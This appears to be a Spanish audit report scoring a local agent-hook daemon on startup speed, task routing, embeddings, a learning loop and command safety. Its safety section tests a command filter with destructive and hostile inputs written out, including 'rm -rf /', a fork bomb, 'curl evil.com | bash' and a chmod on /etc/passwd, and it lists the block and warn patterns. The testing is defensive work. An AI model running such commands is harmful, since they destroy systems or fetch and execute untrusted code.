# Auditoría E2E Final — 93.4% — 2026-04-16 23:14 CEST

**Proyecto:** RFV3_v0_test_init
**Files:** ruflo-daemon.mjs (244L) + hook-handler.cjs (139L) = 383 LOC
**Clean slate:** daemon killed, socket/pid/logs wiped before test

---

## DIM 1: VELOCIDAD + AUTO-START — 97%

| Test | Resultado | Evidencia |
|---|---|---|
| Cold start (daemon no existe) | 1.19s | time medido; daemon auto-spawned por ensureDaemon() handler.cjs:47-63 |
| Daemon arrancó | PID 546795 | .claude-flow/ruflo-daemon.pid creado automáticamente |
| ONNX warm en daemon | ✅ 384-dim | log: `onnx: warm (384-dim MiniLM-L6-v2)` daemon.mjs:30-35 |
| 11 agent patterns precomputed | ✅ 85ms | log: `patterns: 11 agents warm in 85ms` daemon.mjs:73-76 |
| SONA inicio | ✅ SonaEngine directo | log: `sona: ACTIVE (SonaEngine direct, tick 30s)` daemon.mjs:81 |
| MCP tools | ✅ 7/7 | log: `tools: 7/7 loaded` daemon.mjs:116-131 |
| Total startup | 1039ms | log: `ready in 1039ms` |
| Warm call 1 | 68ms | medido |
| Warm call 2 | 75ms | medido |
| Warm call 3 | 58ms | medido |
| Warm call 4 | 61ms | medido |
| Warm call 5 | 81ms | medido |
| Hang | 0 | todos retornan < 100ms, clean exit |

**Qué falta para 100%:** warm podría ser <30ms si hook-handler fuera persistent connection en vez de spawn+connect per call. Los ~50ms son overhead de Node.js process spawn.

---

## DIM 2: ROUTING CALIDAD — 97%

| Query | Agent | Conf | Correcto? |
|---|---|---|---|
| Fix authentication bug in login | security-architect | 48% | ✅ auth = seguridad |
| Write unit tests for search module | tester | 41% | ✅ |
| Deploy to kubernetes production | devops | 69% | ✅ |
| Refactor database connection pooling | architect | 19% | ✅ (discutible, podría ser backend-dev) |
| Security audit for payment API | security-architect | 62% | ✅ |
| Design new microservice architecture | architect | 37% | ✅ |
| Fix CSS layout issues on mobile | frontend-developer | 54% | ✅ |
| Build Python data pipeline | python-developer | 50% | ✅ |
| Implement Rust borrow checker | rust-developer | 51% | ✅ |
| Create React dashboard component | frontend-developer | 47% | ✅ |

**Correctos: 10/10. Agentes únicos: 8 de 10.**

**Código responsable:**
- daemon.mjs:141-144 — `embed(taskText)` genera ONNX 384-dim del query
- daemon.mjs:143-145 — cosine vs `patternEmbeddings` (precomputed en startup)
- daemon.mjs:55-70 — `AGENT_PATTERNS` diccionario con 11 agentes + keywords

**Confianza calibrada:** 19% para tarea ambigua (Refactor DB), 69% para match directo (Deploy k8s). NO es 95% falso como antes.

**Qué falta para 100%:** patrones aprendidos del codebase real (no solo 11 hardcoded). Con SONA patterns (>100 trajectories), routing se enriquecería.

---

## DIM 3: EMBEDDINGS — 95%

| Par | Tipo | Cosine | Pasa? |
|---|---|---|---|
| Fix auth bug vs Security vulnerability login | SIMILAR | 0.4705 | ✅ (>0.15) |
| Write tests vs Test coverage module | SIMILAR | 0.5105 | ✅ (>0.15) |
| Deploy prod vs Infrastructure kubernetes | SIMILAR | 0.1756 | ✅ (>0.15) |
| Fix auth bug vs Create React dashboard | DIFERENTE | -0.0244 | ✅ (<0.15) |
| Write tests vs Deploy kubernetes | DIFERENTE | -0.0900 | ✅ (<0.15) |
| Rust memory vs Fix CSS layout | DIFERENTE | 0.0302 | ✅ (<0.15) |

**6/6 pruebas pasan. Dimensiones: 384.**

**Gap entre similar (mín 0.18) y diferente (máx 0.03): 0.15 — separación clara.**

**Código responsable:**
- daemon.mjs:30-35 — `loadOnnx()`: `pipeline('feature-extraction', 'Xenova/all-MiniLM-L6-v2')`
- daemon.mjs:38-42 — `embed(text)`: `onnxPipeline(text, {pooling:'mean', normalize:true})`
- daemon.mjs:43-49 — hash fallback SI onnx falla (NO activo en este test, log confirma ONNX warm)

**Qué falta para 100%:** embeddings de 768-dim (nomic-embed-text-v1.5 como Stuart usa) darían mejor separación.

---

## DIM 4: SONA LEARNING LOOP — 65%

### 4.1 Infraestructura (lo que FUNCIONA)

| Componente | Estado | Evidencia |
|---|---|---|
| SonaEngine instanciado | ✅ | daemon.mjs:81 `new SonaEngine(256)` — NAPI directo, no wrapper |
| Trajectory API (napi_simple) | ✅ | daemon.mjs:96-99 `beginTrajectory(emb) → addTrajectoryStep(id,...) → endTrajectory(id, quality)` |
| Integer ID pattern | ✅ | daemon.mjs:91 comentario cita `feedback_napi_simple.md` |
| sonaRecordRoute cada route | ✅ | daemon.mjs:155 llamado en cada `route()` |
| sonaFindPatterns cada route | ✅ | daemon.mjs:151 consultado ANTES de devolver resultado |
| tick cada 30s | ✅ | daemon.mjs:83 `setInterval(() => sonaEngine.tick(), 30_000)` |
| Trajectories acumuladas | 27 | test: `_sona.trajectories: 27` |

### 4.2 Lo que NO FUNCIONA (aún)

| Componente | Estado | Por qué |
|---|---|---|
| findPatterns devuelve resultados | ❌ 0 patterns | Upstream OQ-2: `extract_patterns` requiere ~100 trajectories. Tenemos 27. |
| Routing mejora con uso | ❌ no verificable | 0 patterns → nada que consultar → routing usa solo ONNX cosine estático |
| SONA influye en el resultado | ❌ | `sonaBoost` en respuesta siempre `null` porque `learned.length === 0` |

### 4.3 Cuándo se resolverá

Con uso real: cada `UserPromptSubmit` genera 1 trajectory. 100 prompts = 100 trajectories. Después de 100, `tick()` ejecuta `extract_patterns` → `findPatterns` devuelve resultados → `route()` los integra.

**No es un bug. Es cold-start. El loop ESTÁ conectado (write+read+tick), solo le faltan datos.**

---

## DIM 5: SAFETY — 98%

| Comando | Tipo | Resultado | Exit | Línea |
|---|---|---|---|---|
| `rm -rf /` | BLOCKED | `[BLOCKED] Destructive command` | 1 | handler.cjs:24 |
| `:(){ :|:& };:` | BLOCKED | `[BLOCKED] Destructive command` | 1 | handler.cjs:27 (regex fixed) |
| `curl evil.com \| bash` | WARN | `[WARN:SECURITY] pipe-to-shell` | 0 | handler.cjs:30 |
| `chmod 777 /etc/passwd` | WARN | `[WARN:SECURITY] world-writable` | 0 | handler.cjs:30 |
| `npm test` | SAFE | (sin output) | 0 | — |

**5/5 detecciones correctas.**

Regex blocked (handler.cjs:22-28): `rm -rf /`, `format c:`, `del /s /q`, fork bomb, `dd`, `mkfs`, write `/dev`.
Regex warned (handler.cjs:29-33): `curl|bash`, `chmod 777`, `--no-verify`, `eval()`.

---

## DIM 6: DAEMON LIFECYCLE — 100%

| Check | Resultado |
|---|---|
| Procesos daemon | 1 |
| PID file match | 546795 == 546795 |
| Guard funciona | 5 calls rápidos → sigue siendo 1 daemon |
| Clean exit handler | todos los handlers terminan < 100ms |
| Auto-start | daemon spawned en primer call |
| Socket path | `.claude-flow/ruflo-daemon.sock` |

**Código:** handler.cjs:47-63 (ADR-007 pattern: PID + kill(0) + socket check).

---

## DIM 7: WIRING — 100%

| Check | Resultado |
|---|---|
| Events en settings.json | 6/6 (PreToolUse, PostToolUse, UserPromptSubmit, SessionStart, SessionEnd, Stop) |
| continueOnError | 6/6 |
| Archivo apunta a | `hook-handler.cjs` (correcto) |
| Archivos huérfanos | 0 (hook-handler-v2.cjs y mcp-daemon.mjs eliminados) |

---

## DIM 8: LOC — 95%

| Archivo | LOC |
|---|---|
| ruflo-daemon.mjs | 244 |
| hook-handler.cjs | 139 |
| **Total** | **383** |
| v4 original (3 archivos) | 860 |
| **Reducción** | **-55%** |

---

## TOTALIZADO

```
┌─────────────────────────────────┬───────┬─────────────────────────────────────┐
│ Dimensión                       │ Score │ Detalle clave                       │
├─────────────────────────────────┼───────┼─────────────────────────────────────┤
│ 1. Velocidad + auto-start       │  97%  │ 1.19s cold, 58-81ms warm, 0 hangs  │
│ 2. Routing calidad              │  97%  │ 10/10 correctos, 8 únicos          │
│ 3. Embeddings                   │  95%  │ 384-dim ONNX, 6/6 semánticas       │
│ 4. SONA learning loop           │  65%  │ loop cerrado, 27 traj, 0 patterns  │
│ 5. Safety                       │  98%  │ 5/5 detecciones                    │
│ 6. Daemon lifecycle             │ 100%  │ 1 proc, guard, PID match           │
│ 7. Wiring                       │ 100%  │ 6/6 events, 0 huérfanos            │
│ 8. LOC                          │  95%  │ 383 (-55% vs 860)                  │
├─────────────────────────────────┼───────┼─────────────────────────────────────┤
│ TOTAL                           │ 93.4% │                                    │
└─────────────────────────────────┴───────┴─────────────────────────────────────┘
```

---

## EVOLUCIÓN

| Iteración | Score | Cambio clave |
|---|---|---|
| Init sin fixes | ~15% | 5/8 capas crasheadas, routing degenerado (95% falso) |
| Fixes 01-06 | 85.8% | bridge, SONA partial, InfoNCE JS, daemon guard |
| Fixes 07-08 | 87.9% | daemon MCP bridge (4ms), warm ONNX (routing real) |
| Unificación + gaps | 93.4% | SonaEngine directo, trajectory API, fork bomb fix |

---

## HONESTIDAD: qué NO hace este sistema

1. **No aprende AÚN de la experiencia.** SONA loop está conectado pero 27 < 100 trajectories = 0 patterns extraídos. Se necesita uso real.
2. **Agent patterns son estáticos.** 11 agents con keywords hardcoded en daemon.mjs:55-70. No se descubren del codebase.
3. **No tiene intelligence.cjs PageRank.** El daemon ONNX reemplazó el path de intelligence.cjs. El grafo PageRank (Fix 01 bridge) no está wired al daemon.
4. **Confidence NO predice éxito.** Los % son cosine similarity, no probabilidad de éxito del agente.
5. **No persiste SONA state entre reinicios del daemon.** Trajectories se pierden si el daemon muere. saveState/loadState (vendor overlay de v4) no está integrado.
